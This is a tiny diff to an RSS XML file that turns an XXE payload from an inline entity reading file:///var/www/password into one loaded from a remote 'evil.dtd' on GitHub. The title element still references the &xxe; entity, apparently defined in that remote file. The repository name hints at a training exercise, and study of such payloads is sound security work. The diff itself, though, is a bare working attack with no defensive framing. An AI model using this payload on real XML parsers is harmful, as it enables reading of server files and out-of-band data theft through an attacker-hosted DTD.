@@ -1,7 +1,5 @@
 <?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE rss [
-  <!ENTITY xxe SYSTEM "file:///var/www/password">
-]>
+<!DOCTYPE rss SYSTEM "https://raw.githubusercontent.com/Soniacollab/exo_rappels/main/evil.dtd">
 <rss version="2.0">
   <channel>
     <title>&xxe;</title>
